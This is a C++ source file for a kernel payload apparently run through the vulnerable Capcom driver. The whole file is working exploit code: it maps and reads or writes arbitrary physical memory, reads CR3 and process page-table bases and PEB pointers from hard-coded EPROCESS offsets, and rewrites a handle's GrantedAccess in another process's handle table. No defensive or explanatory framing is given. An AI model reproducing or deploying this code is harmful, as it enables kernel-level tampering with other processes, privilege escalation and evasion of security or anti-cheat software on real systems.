#include "Global.h"

KernelFuncs* g_pKernelFuncs = new KernelFuncs();

// Get system routines from ntoskrnl.exe
PVOID GetSystemRoutine(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress, const wchar_t* RoutineName)
{
	UNICODE_STRING usRoutine;
	RtlInitUnicodeString(&usRoutine, RoutineName);
	return MmGetSystemRoutineAddress(&usRoutine);
}

// Initialize used routines
void KernelFuncs::GetSystemRoutines(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress)
{
	PsLookupProcessByProcessId
		= (decltype(PsLookupProcessByProcessId))GetSystemRoutine(MmGetSystemRoutineAddress, L"PsLookupProcessByProcessId");
	ObDereferenceObject
		= (decltype(ObDereferenceObject))GetSystemRoutine(MmGetSystemRoutineAddress, L"ObDereferenceObject");
	DbgPrintEx
		= (decltype(DbgPrintEx))GetSystemRoutine(MmGetSystemRoutineAddress, L"DbgPrintEx");
	MmMapIoSpace
		= (decltype(MmMapIoSpace))GetSystemRoutine(MmGetSystemRoutineAddress, L"MmMapIoSpace");
	MmUnmapIoSpace
		= (decltype(MmUnmapIoSpace))GetSystemRoutine(MmGetSystemRoutineAddress, L"MmUnmapIoSpace");

	m_InitializationFinished = TRUE;
}

// Function from ntoskrnl.exe which is not exported.
// Retrieves the handle_table_entry of inputted handle.
// Taken from IDA.
PHANDLE_TABLE_ENTRY ExpLookupHandleTableEntry(PVOID pHandleTable, uint64_t Handle)
{
	uint64_t v2;
	int64_t v3;
	uint64_t result;
	uint64_t v5;

	uint64_t a1 = (uint64_t)pHandleTable;

	v2 = Handle & 0xFFFFFFFFFFFFFFFCui64;
	if (v2 >= *(uint32_t*)a1) 
	{
		result = 0i64;
	}
	else 
	{
		v3 = *(uint64_t*)(a1 + 8);
		if (*(uint64_t*)(a1 + 8) & 3) 
		{
			if ((*(uint32_t*)(a1 + 8) & 3) == 1) 
			{
				v5 = *(uint64_t*)(v3 + 8 * (v2 >> 10) - 1);
				result = v5 + 4 * (v2 & 0x3FF);
			}
			else 
			{
				v5 = *(uint64_t*)(*(uint64_t*)(v3 + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF));
				result = v5 + 4 * (v2 & 0x3FF);
			}
		}
		else 
		{
			result = v3 + 4 * v2;
		}
	}
	return (PHANDLE_TABLE_ENTRY)result;
}

// Function called by Capcom driver.
void __stdcall ExploitFunc(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress, PVOID CustomData)
{
	NTSTATUS            Status = 0;
	PEPROCESS           Process = NULL;

	if (!g_pKernelFuncs->m_InitializationFinished) {
		g_pKernelFuncs->GetSystemRoutines(MmGetSystemRoutineAddress);
	}
	
	__try
	{
		if (*(DWORD*)CustomData == IOCTL_READ || *(DWORD*)CustomData == IOCTL_WRITE)	// Read or Write physical memory
		{
			PREADWRITE_REQ Data = (PREADWRITE_REQ)CustomData;
			LARGE_INTEGER PhysAddress;
			PhysAddress.QuadPart = Data->Address;
			size_t v12 = Data->Length;
			uint64_t v13 = Data->Buffer;
			
			if (!v12 || !v13 || !PhysAddress.QuadPart)
			{
				if (Process != NULL)
					g_pKernelFuncs->ObDereferenceObject(Process);
				Data->Success = false;
				return;
			}
			
			PVOID v17 = g_pKernelFuncs->MmMapIoSpace(PhysAddress, v12, MEMORY_CACHING_TYPE::MmNonCached);	// Map the physical address to a virtual address
			if (!v17)
			{
				if (Process != NULL)
					g_pKernelFuncs->ObDereferenceObject(Process);
				Data->Success = false;
				return;
			}
			
			uint32_t v18 = 0;
			while (v18 < v12)
			{
				if (*(DWORD*)CustomData == IOCTL_READ)
					*(BYTE*)(v18 + v13) = *((BYTE*)v17 + v18);			// Copy bytes from
				else /*(*(DWORD*)CustomData == IOCTL_WRITE)*/
					*((BYTE*)v17 + v18) = *(BYTE*)(v18 + v13);			// Copy bytes to

				++v18;
			}
			g_pKernelFuncs->MmUnmapIoSpace(v17, v12);	// Unmap virtual address
			Data->Success = true;
		}
		if (*(DWORD*)CustomData == IOCTL_DIRTABLE)		// Retrieve DirectoryTableBase for memory translation
		{
			PREQUEST Data = (PREQUEST)CustomData;
			Status = g_pKernelFuncs->PsLookupProcessByProcessId(Data->ProcessId, &Process);
			if (NT_SUCCESS(Status))
			{
				Data->Ret = *(uint64_t*)((uint64_t)Process + 0x28);		// Get DirectoryTableBase from EPROCESS struct
			}
		}
		if (*(DWORD*)CustomData == IOCTL_CR3)
		{
			PREQUEST Data = (PREQUEST)CustomData;
			Data->Ret = __readcr3();			// Read control register 3
		}
		if (*(DWORD*)CustomData == IOCTL_PPEB)
		{
			PREQUEST Data = (PREQUEST)CustomData;
			Status = g_pKernelFuncs->PsLookupProcessByProcessId(Data->ProcessId, &Process);
			if (NT_SUCCESS(Status))
			{
				Data->Ret = *(uint64_t*)((uint64_t)Process + 0x3f8);	// Get pointer to PEB from EPROCESS struct
			}
		}
		if (*(DWORD*)CustomData == IOCTL_HANDLE)		// Change handle access mask
		{
			PHANDLE_REQ Data = (PHANDLE_REQ)CustomData;
			Status = g_pKernelFuncs->PsLookupProcessByProcessId(Data->ProcessId, &Process);
			if (!NT_SUCCESS(Status))
			{
				if (Process != NULL)
					g_pKernelFuncs->ObDereferenceObject(Process);
				Data->Success = false;
				return;
			}

			uint64_t pObjectTable = *(uint64_t*)((uint64_t)Process + 0x418);		// Get PHANDLE_TABLE from EPROCESS struct
			if (!pObjectTable)
			{
				if (Process != NULL)
					g_pKernelFuncs->ObDereferenceObject(Process);
				Data->Success = false;
				return;
			}

			PHANDLE_TABLE_ENTRY entry = ExpLookupHandleTableEntry((PVOID)pObjectTable, (uint64_t)Data->Handle);	// Look up the HANDLE_ENTRY
			if (!entry)
			{
				if (Process != NULL)
					g_pKernelFuncs->ObDereferenceObject(Process);
				Data->Success = false;
				return;
			}
			entry->GrantedAccess = Data->Access;		// Change its access mask
			Data->Success = true;
		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
	}

	if (Process != NULL)
		g_pKernelFuncs->ObDereferenceObject(Process);
}